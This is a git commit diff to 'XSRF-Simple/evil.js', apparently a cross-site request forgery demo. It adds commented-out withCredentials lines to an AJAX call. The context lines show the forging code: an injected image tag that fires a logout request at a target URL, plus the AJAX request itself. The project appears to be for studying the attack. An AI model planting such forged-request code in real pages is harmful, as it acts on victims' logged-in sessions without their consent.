eed56393fdda0080f1e2a28985ca4e301c18c5a7
Bret Lorimore <bretlorimore@gmail.com>
2017-04-10 19:39:59 -0700

    Add withCredentials flag

--- XSRF-Simple/evil.js
+++ XSRF-Simple/evil.js
@@ -4,6 +4,9 @@ $('body').append('<img src="' + target_url + '?logout">');
 
 $.ajax({
     url: target_url,
+    // xhrFields: {
+    //     withCredentials: true,
+    // },
 }).done(function(r) {
     console.log(r);
 });
